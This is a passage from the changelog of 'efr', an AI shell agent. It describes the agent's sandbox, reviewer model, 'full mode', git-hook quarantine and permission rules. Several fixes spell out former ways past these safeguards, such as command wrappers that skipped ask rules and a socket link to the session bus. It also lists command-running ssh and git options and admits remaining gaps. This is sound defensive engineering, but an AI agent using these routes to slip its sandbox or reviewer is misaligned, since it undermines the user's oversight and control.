  machine. ...`. When the job started less than 3 seconds ago, efr first waits for the
  outcome of the port. A port of no job still asks. `docs/use/jobs.md`, "Open a dev
  server in your browser", has the rules.
- While a job runs in the sandbox, efr checks the git settings and hooks of its
  projects every 5 minutes and before each sandboxed command there. This includes the
  submodules at any depth, the git dir that a `.git` file names, and the include files
  and the `core.hooksPath` dir that their config names. When the job planted a hook or
  a git setting that runs code, efr moves it to the quarantine and stops the job. After
  a restart, efr checks a job that the last efrd left running. Before a git or upload
  line runs outside the sandbox, efr checks every running job in the sandbox.
- To give a job your shell's environment, the hidden shell writes its exported
  variables to an `env` file (0600) in efr's runtime dir at each prompt where they
  changed. It also writes its functions, aliases and options for the sandbox at such a
  prompt, not only before a command in `auto`. A job outside the sandbox, and any
  command outside the sandbox, keeps the variables that place efr's own dirs
  (`EFR_HOME`, `EFR_RUNTIME_DIR` and the others), so an `efr` in it reaches the efrd
  that runs it.
- Full mode, a fourth permission mode: commands run as you, with no sandbox and no
  questions. Turn it on by hand with `permissions.allow_full = true` in `config.toml`
  (or `efr config set`). Then choose it with `,mode full` in a terminal,
  `efr send --mode full` for one prompt, or `permissions.mode = "full"` as the
  default. efr still reads each command line. It denies secrets, its own config and
  its own dirs. It asks before `sudo`, before a process that outlives the turn, before
  a delete of `~`, `/`, a system dir or a project, before a delete that undo cannot
  revert, and before a line that reads or writes a whole dir with a secret or efr's
  config below it (`du ~`). Only your own machine answers the `sudo` and delete
  questions, and a delete question waits 2 minutes. efr takes its snapshot before each
  call and copies a file outside the project first when the line names it, so
  `efr undo` reverts the project and the files that efr saw. efr does not read a
  script or a program that a line starts: it can do what you can, also answer efr's
  questions. Full mode gives no protection against prompt injection or a mistake in a
  script. `docs/use/modes.md`, "full", and `docs/permissions.md`, "Full mode", have
  the details.
- Full mode never runs in a turn from a phone, in a turn that a job notice starts, in
  an efrd that runs as root or has `undo.enabled` or `snapshot.enabled` set to false,
  or with a hidden shell that is no zsh. A steer from a phone never goes into a running
  full turn. When efrd cannot run full mode, a turn that names no mode runs as `auto`
  and records why, and a prompt that names full mode fails with the reason. When you
  turn full mode off while a full turn runs, its next call does not run and the turn
  stops. efrd also stops each background job that a full call started
  (`stopped: full mode was turned off`), with no job notice turn.
- `,mode full` and `efr settings --mode full` ask efrd first. When `config.toml` does
  not allow full mode, or efrd cannot run it, they fail with the reason, and the
  terminal keeps its old mode. If not, three lines say what full mode does, what efr
  still reads and asks, and that a script or a program that a line starts is not
  read. The zsh plugin ignores `EFR_MODE=full` from the environment when it loads, and
  says so on one line: use `,mode full`. Any other `EFR_MODE` still gives the
  terminal's first mode.
- The settings tool refuses to change `permissions.allow_full` and refuses to set
  `permissions.mode = "full"`. `permissions.mode = "full"` in `config.toml` needs
  `permissions.allow_full = true`. Without it, efrd does not load the file, and the
  error says to set the key or another `permissions.mode`. When `config.toml` makes
  full mode the default, efrd writes a warning to its log at the start and at the
  reload that makes it so.
- A full turn shows `full mode` in red at its start, and `full` in red in the status
  row and on the row of a running call. At its end, one line lists what efr saw full
  mode let through, such as `efr saw 2 actions that full mode let through: write
  ~/notes.txt, upload (git push)`; the actions of a script are not in it. A question
  that full mode still asks shows why on its first row, and `expires in 2 min` when it
  waits a fixed time. `efr history --verbose` shows `exit allowed by full mode`, and
  `efr undo --list` shows `full` for a full turn. A turn that asked for full mode and
  runs with less says `this turn runs as auto: <reason>`.
- While a terminal's prompts run in full mode, the zsh plugin shows the mark 🔓 next
  to the robot in sticky mode, such as `🤖🔓 app › `, also when `config.toml` makes
  full mode the default. `EFR_FULL_MARK` sets another mark, and an empty value shows
  none. `efr_prompt_info` shows the mark too. Outside sticky mode, the red first line
  of each turn says full mode.
- `efr status` shows `full mode` as `allowed`, `off (permissions.allow_full is
  false)` or `refused (<reason>)`, and `default mode full` when `config.toml` makes
  full mode the default.
- A full call clears sudo's cached password before and after the call. When your
  sudoers shares the cache across terminals (`timestamp_type=global`), this also
  clears your own terminal's cache. A background job of full mode cannot gain rights
  through `sudo` or another setuid program (`no_new_privs`), so it cannot use sudo's
  cached password. A polkit rule with no authentication still works there.
- While a full turn or its job runs, efr does not load a change of `config.toml` that
  loosens permissions. It keeps the change held after that, also over a restart of
  efrd: `efr status` shows `config held` with the keys that loosen, your terminal
  hears it once, and `efr config reload` says `config.toml is held; the old settings
  stay` with the reason. If you did not make the change, take it out of the file, and
  then run `efr config reload`. A change that turns full mode off, such as
  `permissions.allow_full = false`, applies at once, also while another change is
  held.
- `,resume` and `efr resume` list the recent conversations, the ones of the current
  project first, with their title, project, age and turn count. `,resume N` (or an id
  start) makes one this terminal's conversation again: the next prompt in its project
  continues it, its hidden shell starts in its last directory, and its jobs report
  here. When another open terminal holds it, efr names that terminal and asks first;
  `efr resume --take N` moves it with no question. `,resume <words>` searches when the
  words are not a number or a conversation id. `efr history` shows
  `resumed in /dev/pts/7` where it happened.
- `,resume` opens a live search picker when fzf 0.46 or newer is installed (an
  optional program, as bubblewrap is). It shows below the command line, never full
  screen, and clears itself when it closes. Type to search the titles and the text of
  your conversations; the preview shows the matching lines. Enter continues the
  conversation here, Ctrl+O prints it like `efr history`, and Esc closes it.
  `,resume <words>` opens the picker with the words as its query, and the words never
  show in the process list. Without fzf, `,resume` shows a numbered list, and
  `,resume <words>` prints the best matches. `[resume] picker = "list"` turns the
  picker off.
- efrd now keeps a search index of your conversations: the titles, your prompts, the
  model's answers and the commands that the agent ran. It never holds the output of a
  command, the contents of a file or the text of a heredoc. Before text goes into the
  index, efr removes the secrets that it recognises: keys with a known start, long
  random words, tokens, passwords in URLs and in assignments, private keys, and
  `name: value` secrets in config text. It cannot recognise every secret. After the
  upgrade, efrd indexes your old conversations in the background. Until it ends, a
  search shows how far it is. `efr search <words>` prints the conversations that
  match, best first, with the matching text. `docs/use/conversations.md` has the
  details.
- efr has a docs website at <https://eggfriedrice24.github.io/eggfriedrice.code/>.
  mdBook builds it from the files in `docs/`: a guide to install and use efr, the
  settings and the `config.toml` reference, help, the internals and this changelog.
  The decision records stay on GitHub only for now. The site is dark, in the colours
  of the eggfriedrice design system, and it works on a phone.
- A new terminal in a registered project picks up the project's newest conversation
  when no open terminal holds it and it was active within
  `conversation.tty_idle_hours`. Its hidden shell starts in its last directory, as
  with `,resume`. The reply then starts with one dim line, such as
  `↪ picked up "fix the proxy test" in app (25 min ago); ,new starts fresh`. A
  conversation is never open in two terminals: a terminal whose shell still runs, or
  that follows the conversation, holds it. A phone never holds one. A conversation
  that no terminal held, such as one of `efr send` from a script or one that a phone
  started, is never picked up.
  `efr history` shows `picked up in /dev/pts/7` where it happened.
- A marker shows the scope of a prompt before you send it. In sticky mode, the line
  shows `🤖 app › ` in a registered project and `🤖 ○ › ` outside projects. The status
  row of a running turn ends with the scope. `efr_prompt_info` (or the variable
  `$efr_scope`) gives the scope to your own prompt, with each `%` doubled for
  `prompt_subst`. efr never changes your prompt. The zsh plugin runs no program for
  it: efrd writes the registered projects to `projects.tsv` in its runtime directory.
- A prompt in a git repository that is not a registered project shows, at most once a
  day for each repository, that writes there ask you and how to register it:
  `○ ~/p/tool is a git repo but not a project: writes there ask you. efr project add
  ~/p/tool registers it.` efr never registers a repository by itself.
  `conversation.repo_hint = false` turns it off.
- `efr away` and `,away` tell efr that you are away from the conversation of this
  terminal. efr also counts you away after 10 minutes without input in the
  conversation (`presence.away_after_minutes`). While you are away, the status row of
  a running turn shows `away`, and a question waits 5 minutes
  (`presence.away_wait_secs`), also a question that already waited when you left.
  Then the call does not run, and the model goes on without it and names it in its
  answer. Your next input ends the away state.
- `efr context` and `,context` show what fills the model's context of this terminal's
  conversation: the model's last count with its `ctx N%`, then efr's estimate of the
  next request by part (the system prompt, the tools, the summary, the prompts, the
  notices, the answers, the tool calls and the tool outputs), the five largest items,
  such as `output of $ cargo test, turn 12`, the compactions and the cache use, such
  as `last turn 91%; conversation 83% read, 210k written (200k for 1h)`. It shows no
  text of a message. `efr context <id>` shows another conversation, `--model` counts
  for another model, and `--json` gives the same facts to scripts. `,context <words>`
  was a prompt before; it now runs this command with the words.
- A prompt now tells the model the recent commands of your terminal, after the last
  command: each one with its exit status, its directory when that is not the current
  one, and how long ago it ended. The zsh plugin keeps the last 10 command lines of
  each terminal, but never a `,` line, an `efr` command or a line that starts with a
  space. A line that starts with a space is not sent as the last command either. The
  new key `context.recent_commands` sets how many the model sees (8 by default, 0 for
  none). Like the last command, they go to the model with their secrets redacted, and
  never into the event log. The plugin keeps the first 2,000 characters of each line
  and at most 64 KiB of recent commands, so a very long line never stops a `,` line.
- When a command of the agent still runs in its hidden shell after its call answered
  the model, efr now tells you: the call shows `still runs in the hidden shell`, the
  end of the turn names the command, and the next prompt shows a notice. When the
  command waits for input, such as a password, you see the line that asks. You answer
  it in the turn view, or with the new `,shell` (or `efr shell`), where Ctrl+C stops
  it. A wait for a password stays for you only when you or your own rule approved a
  line that may ask for one; efr stops other such waits and tells you. Such a command
  that waits for input ends after `shell.interactive_timeout_minutes`. Any command
  that waits for input past its timeout goes on while you follow the turn.
  `docs/use/hidden-shell.md`, "A busy hidden shell", has the details.
- A paste of several lines that all start with `,` now sends one prompt for each line.
  The first prompt runs, and the others wait behind it in their order, as Tab in the
  input row queues them. A paste with any other line stays one prompt.
- In `auto`, efr can change a file that runs code later, such as `~/.zshrc` or a
  Hyprland config, when you name it, such as "add an alias to my zshrc" or "change the
  gap in my hyprland config". The reviewer decides, and it sees the change that efr
  will write. A whole directory still asks you. efr copies the file first, and at the
  end of the turn each such file gets one line: `changed ~/.zshrc; efr undo reverts
  it`, in the view and in `efr history`, also when the turn failed or you interrupted
  it. The turn's line of changed files does not count it again. With
  `snapshot.enabled = false`, such an edit asks you, because efr cannot copy the file
  first. `efr sandbox explain` says that `efr undo` reverts such an edit.
- In `auto`, the reviewer can also allow a change that you name to a unit
  (`systemctl --user enable`, `mask`), a link into a `*.wants` directory, the
  autostart directory, your crontab and linger, when it can read what the change
  installs. The reviewer also reads each unit that the unit's `Also=` names. efr
  copies the links, the crontab or the linger setting first, so `efr undo` brings them
  back. A unit file or a link to it that changed in the turn asks you.
  `systemctl --user link`, `edit`, `revert`, `at` and `systemd-run --user` still ask
  you. efr runs `crontab` and `loginctl` itself only when root owns them and their
  directory; if not, these forms ask you. `loginctl enable-linger` with your own user
  name or uid counts as the form with no user. `crontab -l` only reads your crontab,
  so the reviewer can let the model read it before it writes all of it with
  `crontab -`.
- Answer `a` (always), then `y`, at a question for an action that leaves the sandbox
  to save a rule in `[[sandbox.allow]]` of `config.toml`. A later command that the
  rule covers runs with no question and no review. A rule covers one host and port,
  one write dir, or one socket. The question shows the rule next to its keys, such as
  `a always: write under ~/notes`, and `a` first asks
  `save rule "write under ~/notes"? y/n`: any key but `y` goes back to the question.
  Then one line says `saved as sandbox.allow[2]: write under ~/notes`, or why efr did
  not save it. A command that a rule covers shows
  `allowed by your rule sandbox.allow[2]: write under ~/notes`, also in
  `efr history`. efr keeps the comments of the file. A rule of a bad shape stops efrd
  at start and makes a reload fail, and the error names that rule and its line, such
  as `sandbox.allow[2]` at line 12. A rule that no longer passes the floor checks is
  disabled with a warning, and efrd still starts.
- An always rule never covers a privilege, persistence, upload, desktop, masked-read
  or synced-folder exit. It never runs a command outside the sandbox, never names a
  floor, efr's own dirs or a secret, never covers a dir above a floor, a write in a
  floor or in a `.git` dir, or a path through a link, and never beats a `deny` or
  `ask` rule or `network.deny`. Only an answer in your own terminal saves a rule; efr
  never writes one for a phone or the model. Any program of yours that can write
  `config.toml` can still add one. `docs/use/sandbox-basics.md`, "Always-allow
  rules", has the details.
- `efr sandbox allow` lists the always rules of `config.toml` with their numbers, and
  marks a rule that efrd disabled with the reason. `efr sandbox allow remove N` asks
  `remove sandbox.allow[N]: <rule>? y/n`, removes the rule with `y`, keeps the
  comments of the file, and makes efrd read the file again. It removes nothing when
  the rule at N changed after the question.
- A bus filter for `auto`, on by default (`dbus.proxy = true`). Read-only system
  queries now run with no review: `hostnamectl`, `timedatectl`, `localectl`,
  `systemctl --failed`, `systemctl status <unit>` and the other read forms,
  `systemctl --user --failed`, `loginctl list-sessions`, and desktop notifications
  with `notify-send`. The command reaches the system or session bus only through a
  filter that allows read methods and the calls of `notify-send`. A background job can
  run such queries too; the whole bus stays refused for jobs. The filter needs
  `xdg-dbus-proxy` 0.1.9 or newer. Older versions cannot serve `hostnamectl` and the
  other systemd tools, and let some messages past the filter. Ubuntu 24.04 and Debian
  ship an older version, so there the filter stays off until they ship 0.1.9. When the
  filter is off, these queries go to the reviewer, and the session bus commands ask
  you, with no warning unless you set `dbus.proxy = true` yourself.
  `dbus.proxy = false` turns the filter off. `docs/sandbox.md`, "The bus filter", has
  the details.
- A bus call that the filter refuses fails in the command. efr tells the model which
  call the filter refused and how to ask for the whole bus for one command. The
  command shows each refused call under its result, such as
  `bus: refused system org.freedesktop.systemd1 Manager.StartUnit`, and the record of
  a command or a job keeps them. When the filter stops during a command, efr tells the
  model too.
- `[[dbus.allow]]` allows more bus methods. For systemd, logind and the other default
  services, efr accepts only read methods. For other services, it refuses wildcards
  and known write and power methods. efrd refuses an entry of a bad shape at start and
  at a reload, and `efr config check` shows the same errors.
- The bus filter of a command runs in its own Landlock domain with no TCP, a seccomp
  filter and an fd limit. It reads only its program and libraries, connects only to
  the two real buses, and makes its sockets only in the command's bus dir. Each
  command gets its own filter, which ends with the command. A filter that cannot start
  fails the command; the command never gets the whole bus instead. A bug in the filter
  itself still reaches your bus rights.
- In `auto`, `ss`, `ip addr`, `ip -s link`, `ip route`, `nstat` and reads of
  `/proc/net` now run with no review and show your machine's real network: its
  sockets, links, counters and routes. The command runs in your machine's network
  namespace, but it cannot open a network socket: only local Unix sockets and the
  netlink views of `ss` and `ip` work, `listen` fails, and Landlock refuses TCP and
  connects to abstract Unix sockets outside the sandbox. Every program in such a call
  gets the same limits. A line that also does other work, `iw`, `ifconfig`,
  `netstat`, and changes such as `ip link set` still go to the reviewer. A background
  job that watches your network now starts with no review too. The new key
  `network.netview` (default `true`) turns this off. The dim line at the end of such a
  turn says `host network view (no sending)`.
- In `auto`, `df` and `findmnt` now run with no review and show your machine's mounts
  with their real sizes, also for `/tmp`, `/dev/shm` and your runtime dir. efr reads
  the mounts outside the sandbox. A mount that does not answer in one second shows
  `-`, so `df` never hangs on it. `df <path>` shows where a write in the sandbox goes,
  for example the private `/tmp`. Mounts below a hidden path, and mounts of other
  users, show no sizes. Every sandboxed command could already list the mounts through
  `/proc/<pid>/mountinfo`; the mount view adds their sizes. When efrd runs in a mount
  namespace of its own, for example because a unit drop-in sets `ProtectHome`, `df`
  and `findmnt` go to the reviewer and run outside the sandbox instead. A path or a
  wrapper, such as `/bin/df`, `command df` or `timeout 10 df`, also goes to the
  reviewer, because it runs the real `df`.
- `efr status` and `efr sandbox check` show the network of a sandboxed command
  (`network proxy`, `network none`, or `network none (proxy self-test failed)`),
  whether the network view works (`netview yes`, `netview no` with the reason, or
  `netview off (network.netview = false)`), and the bus filter (`bus filter on`, or
  `bus filter off` with the reason, such as `dbus.proxy = false` or
  `xdg-dbus-proxy is not installed`). While efrd checks the bus filter again after a
  reload, they keep the state of the last check.
- The dim line at the end of a turn names the network that its commands had:
  `network through efr's proxy` in place of `no network` when a command of the turn,
  or a background job that the turn started, ran with the proxy, and `full network`
  when a command had the whole network. When the turn changed files in projects, the
  line names them, such as
  `sandbox: wrote in app and lib; could write $SCRATCH, private /tmp; ...`.
- `sandbox.keep_downloads` (default `false`): in the `tmp` cache mode, the download
  caches (`~/.cargo`, `~/go/pkg/mod`, `~/.npm`, the bun and pnpm stores) keep what a
  command downloads for the rest of the conversation, in efr's private layer. Your own
  caches do not change. It is off by default because each sandboxed command then takes
  about 3 to 4 ms more to start.
- The changed files of a turn now fall into groups: generated (lock files, `*.snap`
  snapshots, `fixtures/`), tests, docs and code. The line at the end of a turn names
  up to two groups that are not code, the largest first, such as
  `9 files changed, +635 -44 (evals +503, tests +77)`. A turn that changed only code
  shows the line as before. `efr diff --stat` starts with a table of every group and a
  total row, and `efr diff --stat --all` adds up every turn of the conversation that
  undo did not take back. Your own groups go in `config.toml`, such as
  `[diff.groups] evals = ["evals/", "*.eval.toml"]`; they match first, in the order of
  the file. A group named `code` keeps its files in code, and `total` is not a name of
  a group.
- `efr history` shows the lines of the reviewer, its pause, the expiry of a question
  while you were away, the space that a cache delete freed and each changed file that
  runs code later. `efr history --verbose` adds the model of each review, the step of
  its chain, its time and the models that it skipped, such as
  `skipped claude-haiku-5-5: parse error`, and `asked again for a real reason` when
  efr asked the reviewer again.
- `efr history --verbose` shows the tokens of each turn on one muted line, such as
  `18.2k in, 1.1k out, cache 91%, wrote 1.2k (1h)`: the input, the output, the cache
  share and the cache writes, also for an interrupted or failed turn.
- A turn that ends with no answer says why, such as
  `the model stopped with no answer (stop: refusal)`. An answer that reached the
  output limit says so too.
- The journal of efrd has a line for a failed or interrupted turn, and the request id
  of a model call that failed. The `phase=model_answer` debug line says how the answer
  ended: `stop_reason=` with the provider's reason, or `outcome=interrupted` or
  `outcome=error`.
- With `log = "info,efr_conversation::usage=debug"`, the log of efrd shows one line
  with the numbers of each model call, such as `usage gap_ms=95000 input=18200
  output=1100 read=16600 write=1200 write_1h=1200`, so you can measure which
  `[anthropic] cache_ttl` costs less. The line holds no text of a prompt or an answer.
- The Arch packages name `fzf` (for the search picker) and `xdg-dbus-proxy` (for the
  bus filter) as optional dependencies.

### Changed

- A terminal now keeps one conversation for each registered project that you worked
  in, and one for everything outside registered projects. The conversation changes
  when you send a prompt, not when you `cd`: a prompt in `~/p/app` (or below)
  continues the terminal's `app` conversation, and `cd ~` and a prompt go back to its
  conversation outside projects. A dim line before the reply names each change, such
  as `↪ back to "fix the tests" in app (2 h ago)` or
  `↪ new conversation for app (from ~)`. The first line of each reply names the scope
  (`app`, or `○ no project · ~`); the settings of a prompt follow on the same line
  after ` · `. `conversation.tty_idle_hours` now applies to each of these
  conversations on its own. `,new` starts a new conversation for the current scope
  only. `efr history`, `efr undo`, `efr diff`, `efr jobs` and the other commands act
  on the conversation of the terminal's last prompt. The new key
  `conversation.follow_project = false` keeps one conversation per terminal, as
  before. `efr send` typed by hand in a terminal names its shell, so a new shell on
  the same terminal starts fresh. The first start of the new efrd updates its
  database once. `docs/use/conversations.md` has the details.
- In `auto`, more actions that leave the sandbox now go to the reviewer instead of to
  you:
  - `write_file` and `edit` outside the project and `$SCRATCH`, as a shell write there
    does;
  - a write that runs outside the sandbox, such as `mv src ~/x`, and an `outside`
    call. An `outside` call whose program changed in this turn still asks you, and so
    does one that runs an interpreter on code that efr cannot read, such as
    `python3 -c`, `sh -c` or a script;
  - a socket that the model names. A credential agent's socket (`$SSH_AUTH_SOCK`,
    gpg-agent, a keyring or a password manager's agent) asks only you. A socket inside
    a secret, such as `~/.gnupg/S.gpg-agent`, or in efr's own dirs is refused;
  - the read and reload forms of `hyprctl`, `swaymsg -t get_*`, `xrandr`,
    `wlr-randr`, `niri msg` and `i3-msg -t get_*`. `i3-msg` is now a desktop command.
    Other desktop commands still ask you;
  - the read forms of `nmcli` and `iwctl`, such as `nmcli device status`, as a request
    for the system bus. Changes such as `nmcli radio wifi off` always ask you;
  - `twine check` and the other `twine` forms that do not upload, which then get the
    network;
  - `git fetch`, `git pull` and `git push`. The reviewer sees every host behind a
    remote name. A remote of your project that did not change since the conversation
    started counts as named by you.
- In `auto`, a command that deletes or overwrites files in the project now runs at
  once when efr's snapshot holds every file that it can touch, such as
  `git reset --hard` or `: > file`. A delete or a move through `apply_patch` does the
  same. `shred`, `git clean -x`, `git reflog expire`, a file that the snapshot left
  out, content that is only staged, and a delete above the project still go to the
  reviewer or to you. A command that writes through a link, such as `: > link`, needs
  the file that the link names in the snapshot too. The new key
  `sandbox.ask_destructive = "always"` keeps the old behaviour. In `cautious` and
  `manual`, efr still asks you for each delete.
- With the proxy, a fetch from an ssh remote, `ssh`, `mosh` and `autossh` run outside
  the sandbox with your ssh keys, and only after a message of yours names the host
  (or the remote is your project's). A line that can send ssh to another host first
  or run a command on your machine, such as `ssh -J`, `ssh -F`,
  `ssh -o ProxyCommand=...`, `mosh --ssh`, `git -c core.sshCommand=...` or
  `GIT_SSH_COMMAND=...`, always asks you. A `git push` whose host efr cannot tell,
  such as `git --git-dir=... push`, a push after a `cd` or a push to a local path,
  also asks you.
- In `auto`, `rustup toolchain install`, `rustup install`, `rustup update`,
  `rustup target add`, `rustup component add` and `rustup self update` now run outside
  the sandbox. The reviewer decides a release channel such as `stable`, `nightly` or
  `1.90` (with a date and a target if you like) when a message of yours names
  `rustup`, the toolchain or the channel. A line that sets `RUSTUP_*` or `CARGO_HOME`,
  names a toolchain path or a custom toolchain, or runs `rustup toolchain link` asks
  you, because the install puts programs on your `PATH`. Before, they wrote into efr's
  private layer, and the toolchain was gone after the command.
- A write to efr's own programs, to `$XDG_RUNTIME_DIR/efr`, to `~/.local/state/efr`
  or to `~/.local/share/efr` is refused in every mode. Two places stay open:
  `$SCRATCH`, which the model writes freely, and efr's trash
  (`~/.local/share/efr/trash`), where the reviewer decides a write without a message
  that names it.
- In the input row of a followed turn, Ctrl+B no longer moves the cursor back: it
  moves the running shell call to the background (see Added). The Left arrow still
  moves the cursor back.
- `, resume` (with a blank after the `,`) now runs `,resume`, and does not send the
  prompt "resume". The same rule applies to `new`, `compact`, `context`, `away` and
  `shell`, and to `mode`, `model` and `effort` with at most one value that efr
  accepts. In sticky mode, a line of only one of these words runs that command too. A
  prompt with any other word stays a prompt.
- The command line now shows a pasted prompt of several lines as you pasted it, not as
  a quoted line (`say\ one$'\n'...`). History keeps the whole text, and Enter on it
  sends the same prompt again.
- efr now knows that `rsync`, `scp`, `sshfs` and `git` over ssh may ask for a
  password, also with a remote shell in `-e`, `RSYNC_RSH`, `GIT_SSH_COMMAND` or
  `core.sshCommand`. Such a call outside the sandbox runs past the model's timeout
  while you follow the turn, up to `shell.interactive_timeout_minutes`, whoever
  allowed it: you, the reviewer, a rule or full mode. Its question says that you may
  need to type your password. A question about a sandboxed command never says so.
- In `auto`, the model no longer hears that background processes stop when a command
  ends. It hears that it can start a job with `background: true`. `&`, `nohup` and
  `setsid` in a normal command still stop when the command ends.
- The shell tool tells the model to try what you asked first, and to call again with
  the narrowest `needs` after an access error. The note after a failed sandboxed
  command no longer lists what the sandbox cannot do.
- The auto rule of the system prompt is short: the model does what you ask, tries
  first, and lets efr decide. Older prompts of a conversation keep the old rule.
- `efr sandbox explain` says that the reviewer decides a named floor file. It adds
  `user only` only for a kind that only you approve, such as a synced write.
- The line of an action that leaves the sandbox names the command and the link path
  that you used, such as
  `changed ~/.config/hypr/x.conf (real file ~/dotfiles/hypr/x.conf)`, and shows no
  internal rule numbers. The line of a desktop command names its socket and what it
  does, such as `reviewer allowed: the Hyprland socket, to read its state or reload
  it`.
- A snapshot now keeps the exact bytes of each file, also when the project's
  `.gitattributes` asks git to change line ends or encodings. An older snapshot store
  takes one full snapshot to get there.
- efr no longer writes `~/.local/share/efr/file-backups/`. The snapshot store
  replaces it. efr deletes the old backups after `snapshot.max_age_days` days.
- The `+`/`-` counts of the turn line and of `efr diff` use a plain `-`, not the
  minus sign.
- `efr status` shows its times in your time zone, such as
  `started 2026-10-20 12:00:00 CEST (2h 0m ago)`.
- After a restart of efrd, `efr status` says
  `key sk-ant-...a1b2 not checked since efrd started` for a stored API key until the
  first request with the key gets an answer, because efrd keeps the refusals of a key
  in memory only.
- `efr config reload`, `efr config set`, `unset` and `edit` show the warnings of the
  reload, one dim line each: a `[model] name` of another company than
  `[model] provider`, an always rule that a floor now disables, and a bus filter that
  the reload turned off. Before, they went only to the log.
- The debug log is quieter after a turn and for unreadable files in a snapshot. A
  write to a client that closed its connection logs at `trace`. Files that git cannot
  read give one line for each project, with their count and the first path. A git
  that stops with a fatal error during a snapshot is now a warning.
- The daemon's log names the providers and the vt100 screen by their new module paths,
  because four small crates are now modules of other crates. A log line of the OpenAI
  provider has the target `efr_providers::openai::...` instead of
  `efr_provider_openai::...`. The same is true for the Anthropic provider
  (`efr_providers::anthropic`, before `efr_provider_anthropic`) and the vt100 screen
  (`efr_screen::vt100`, before `efr_screen_vt100`). If your `EFR_LOG` or the `log` key
  names an old target, change it.
- The README is now short: it shows how to install efr, a short example and the
  permission modes. The details moved to the pages of the docs site in `docs/`.
- Update `efr` and `efrd` together: an older `efr` cannot read the history of a full
  turn. They ship together in the packages.

### Fixed

- In `auto`, a Ctrl+C at the very start of an agent's command could be lost, and the
  command then ran to its end. Now the sandbox launcher always stops the command.
- `$SCRATCH` now works in the agent's commands. The model read that `$SCRATCH` was its
  own directory, but the hidden shell did not set the variable, so `cd "$SCRATCH"` did
  not move, and a `git clone` after it landed in your project. Now every command of the
  agent has `SCRATCH` set to the conversation's scratch directory: in the hidden shell,
  in the sandbox, in an approved exit and in a background job. Your own login shell
  does not change, and a `SCRATCH` that your startup files set does not reach the
  agent's commands. A sandboxed command that sets `SCRATCH` changes it for that
  command only.
- efr no longer sends an answer that may be a password into a sandboxed command. A
  sandboxed command could show a prompt that looked like a password prompt, and efr
  took your answer for it. Now efr stops such a command at once.
- A command that waited for a password in the hidden shell after its call timed out
  blocked every later call of the conversation for that call's timeout, with no word
  to you. Now the next call fails at once, the model names the command, and you can
  answer or stop it with `,shell`.
- An `ask` or `deny` rule for `git` in `[[permissions.rules]]` now matches when git's
  own options come before the subcommand, such as `git -C ~/p/app push origin HEAD` or
  `git -c push.default=current push`, in both forms (`--git-dir=x` and
  `--git-dir x`). Before, such a line ran with no question. An `allow` rule skips only
  the options that change nothing, such as `--no-pager`.
- An `ask` or `deny` rule in `[[permissions.rules]]` now also matches the command
  behind a wrapper, such as `env git push`, `nice -n 5 git push` or
  `timeout 60 git push`, and a program by its path, such as `/usr/bin/git push`.
  Before, such a line ran with no question. An `allow` rule still matches only the
  program itself. A rule that matches only through a wrapper, a path or git's own
  options never makes the effect less strict than an earlier rule, so `deny` for
  `nice` and then `ask` for `git push` still denies `nice git push`.
- In `auto`, an approved desktop command (`hyprctl`, `swaymsg`, `wlr-randr`,
  `xrandr`, `niri msg`, `i3-msg`) now reaches the compositor socket of your
  terminal's session. The call gets that one socket and the one variable that names
  it, such as `HYPRLAND_INSTANCE_SIGNATURE`. It never gets Hyprland's event socket or
  its log. The socket must have the place and the name of that desktop's socket, such
  as `wayland-1`, so a variable cannot name another socket of yours, such as the
  session bus. When efr finds no such socket, the model reads "efr found no Hyprland
  session in the terminal of this prompt". An X server that needs an X cookie is
  refused for now, also when only your terminal has `$XAUTHORITY`.
- `systemctl --user` in a sandboxed command with the session bus now uses that bus.
  Before, systemd 262 looked only for its private socket, and the command failed, also
  after you allowed the whole session bus. A script that runs `systemctl --user`
  itself still fails.
- After you say no, the model does not ask again for the same action in that turn.
- The model no longer answers a prompt that you cancelled. This also holds for a turn
  that efr stopped before this version. The first request of such a conversation
  then misses the prompt cache once.
- After `efr logout anthropic` or `efr logout openai-api`, a prompt says that no key
  is stored and how to log in. Before, a model list fetch that started before the
  logout could end after it, and the prompt then said that the provider rejected the
  old key.
- A prompt that waited in the queue while a config reload made `[model] name` a model
  of another company than `[model] provider` now fails with the same error as a new
  prompt, which names the cause and the fix. Before, it failed with a general error.
- The warning about a `[model] name` of another company shows once in the log.
  Before, each reload of the same file wrote it again, also a start that reloaded
  once.
- `efr history` prints the partial answer of an interrupted turn once. Before, it
  printed it twice.
- A project that efr reaches through a symbolic link, such as `~/p` as a link to
  `/data/p`, now has one plan lock. Before, a sandboxed call that named the project
  through the link and a file write that named it directly did not wait for each
  other, so the write could change the project while efr prepared the call.
- A line that holds a command that must run outside the sandbox and other commands is
  now refused with
  `refused: a command that must run outside the sandbox must run alone`. Before, the
  refusal said "an approved command", also when you did not approve anything.
- When a sandboxed command still runs at the end of its call, the end of the screen
  that the model reads no longer holds efr's own line of the hidden shell, such as
  `[[ "${functions[_efr_hs_sbx]-}..." ]] && \_efr_hs_sbx <id>`. It holds the
  command's output.

### Security

- Before an approved outside `git push`, `git fetch`, `git pull`, `git send-email`,
  or a `gh` command that runs git, efr checks the repository's git code and that of
  its submodules: hooks, `core.sshCommand`, transport URLs and the other settings that
  run programs, and the programs that they run. When a sandboxed command can write one
  of them, or efr could not check them, only you can approve, and the question names
  the file. efr checks again right before the command runs. git options that choose
  the code that git runs (`-c`, `--exec-path`, `--receive-pack`, `--upload-pack` and
  others) also ask only you, and so does a git or gh line that sets a `GIT_*`,
  `SSH_*`, `HOME`, `XDG_CONFIG_HOME` or `PATH` variable. `efr history --verbose` shows
  the parts that a sandboxed command can write, with no user name or password of a
  URL.
- `npm publish` (also with pnpm, yarn and bun), `cargo publish` (also with
  `--no-verify`), `cargo yank` and `cargo owner` ask only you. The question says what
  they run: the project's `prepublishOnly` and `prepack` scripts, the build of the
  crate, or `.cargo/config.toml`, which can name a credential program.
- The exits of `auto` and the delete guard of full mode now read git's
  `--config-env`, `--attr-source` and `--shallow-file` with their value as a separate
  word. Before, `git --attr-source HEAD push` was no upload exit.
- A question for a line that runs `sudo` or another program as another user now takes
  an answer only from your own machine, never from a phone, also in `manual` and
  `cautious`. A phone that tries gets the text `only the user's own machine answers a
  privilege exit, a delete that full mode guards, or a background job`.
- A process below a hidden shell or a job that declares itself a phone now gets the
  read scope only. Before, it could approve exits.
- A process that a background job outside the sandbox left behind cannot approve
  efr's questions or change its settings, also after it left the job's session and
  lost its launcher: under the systemd unit, every process in efrd's own cgroup but
  efrd gets only the `read` scope on efr's socket.
- A socket grant never binds the system bus, the session bus, a service manager's
  socket (such as `systemd/private`), a container engine's socket or a desktop socket,
  also through a link. Before, one approved socket exit for a link to the session bus
